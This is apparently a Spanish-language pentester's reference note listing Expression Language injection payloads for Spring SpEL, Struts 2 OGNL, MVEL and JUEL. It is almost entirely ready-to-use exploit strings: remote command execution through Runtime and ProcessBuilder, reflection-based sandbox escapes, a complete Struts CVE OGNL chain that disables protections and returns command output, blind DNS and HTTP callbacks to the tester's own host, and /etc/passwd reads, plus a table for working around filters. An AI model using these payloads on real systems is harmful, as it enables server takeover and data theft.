---
tipo: meta
aliases:
  - payloads EL
  - SpEL RCE
  - OGNL RCE
tags:
  - meta/referencia
  - dominio/web
---

# EL injection payloads - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué pegar una vez identificado el motor. Identificarlo es el paso previo, en [[EL injection - matriz de identificación]]; el criterio, en [[MOC - EL injection]].

## 1. SpEL — Spring

Ejecución directa:

`T(java.lang.Runtime).getRuntime().exec('id')`
`T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})`

Con lectura de la salida:

`new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'}).getInputStream()).next()`

Vía ProcessBuilder, cuando `Runtime` está filtrado:

`new java.lang.ProcessBuilder(new String[]{'/bin/sh','-c','id'}).start()`

En contexto Thymeleaf:

`__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
`${T(java.lang.Runtime).getRuntime().exec('id')}`

Escape del sandbox de SpEL (cuando el `EvaluationContext` está restringido):

`T(org.springframework.expression.spel.standard.SpelExpressionParser).newInstance()...`
`T(java.lang.Class).forName('java.lang.Runtime')...` — reflexión para saltear la lista de tipos

## 2. OGNL — Struts 2 y directo

El preámbulo que reabre el acceso a miembros, necesario en las versiones con sandbox:

```
(#_memberAccess['allowStaticMethodAccess']=true)
(#ctx=@ognl.OgnlContext@class)
```

Ejecución:

`@java.lang.Runtime@getRuntime().exec('id')`

```
(#a=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'}).start())
```

Cadena completa típica de un CVE de Struts (leer la salida a la respuesta):

```
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

Dónde entra, según el CVE:

| Punto de entrada | Nota |
|---|---|
| Cabecera `Content-Type` | La subida de archivos evaluaba la cabecera |
| Nombre de parámetro | No el valor: el nombre |
| Parámetro con prefijo especial | Forzaba la evaluación |
| Un valor de acción reevaluado | En páginas de error |

Ver [[EL - OGNL en el framework]]. El payload exacto depende de la versión: identificarla es lo que decide cuál usar.

## 3. MVEL

`Runtime.getRuntime().exec('id')`
`new java.lang.ProcessBuilder({'/bin/sh','-c','id'}).start()`

MVEL suele no tener sandbox, así que el payload directo funciona más veces que en SpEL u OGNL.

## 4. JUEL — el limitado

JUEL por defecto **no** llega a `Runtime`. Lo que sí se lee es el contexto:

`${pageContext}`
`${applicationScope}`
`${sessionScope}`
`${pageContext.request.getServletContext().getRealPath('/')}` — la ruta física de la aplicación
`${pageContext.request.getHeader('...')}`

Es la rama de lectura, análoga a [[SSTI - lectura sin ejecución]]. Lo que aparece —rutas, atributos de sesión, configuración— puede alcanzar para escalar por otro dominio.

Con bibliotecas extendidas cargadas (por ejemplo, funciones de JSTL peligrosas) a veces sí hay ejecución, pero es la excepción.

## 5. Confirmación ciega — sin ver el resultado

Un identificador por motor hacia un servidor propio. Ver [[EL - evaluación indirecta y ciega]].

**SpEL:**
`#{T(java.net.InetAddress).getByName('spel.mi-dominio.com')}`
`#{new java.net.URL('http://mi-host/spel').openStream()}`

**OGNL:**
`%{(new java.net.URL('http://mi-host/ognl')).getContent()}`
`@java.net.InetAddress@getByName('ognl.mi-dominio.com')`

**MVEL:**
`@{java.net.InetAddress.getByName('mvel.mi-dominio.com')}`

Si el egress HTTP está cerrado, queda el DNS, que suele salir. Es la misma lógica que el canal ciego de [[SSTI payloads - matriz de referencia]] y de [[Command injection ciego - matriz de referencia]].

## 6. Lectura de archivos sin ejecución

Cuando el sandbox impide `Runtime` pero deja instanciar clases de E/S:

**SpEL:**
`new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))`

**OGNL:**
`@org.apache.commons.io.IOUtils@toString(new java.io.FileInputStream('/etc/passwd'))`

Es el escalón intermedio del dominio: menos que RCE, más que leer el contexto. Vale cuando el escape del sandbox para ejecución no se logró.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `EL1005E` / acceso a tipo denegado | Sandbox de SpEL. Probar reflexión, § 1 |
| `Expression exceeded maximum allowed length` | Struts con límite. Acortar o usar otro punto de entrada |
| `allowStaticMethodAccess` no ayuda | Versión de OGNL con lista blanca. Necesita el preámbulo de limpieza de § 2 |
| El motor es JUEL y no ejecuta | Esperable. Ir a lectura de contexto, § 4 |
| Nada vuelve | Evaluación ciega. Confirmar con § 5 antes de dar por muerto |
| El payload de Struts no funciona | Versión equivocada. El payload es específico del CVE |
| `Runtime` bloqueado pero se instancian clases | Ir a `ProcessBuilder`, y si no, a lectura de archivos § 6 |

## Relacionadas

[[MOC - EL injection]] · [[EL injection - matriz de identificación]] · [[SSTI payloads - matriz de referencia]] · [[Command injection evasión - matriz de referencia]]
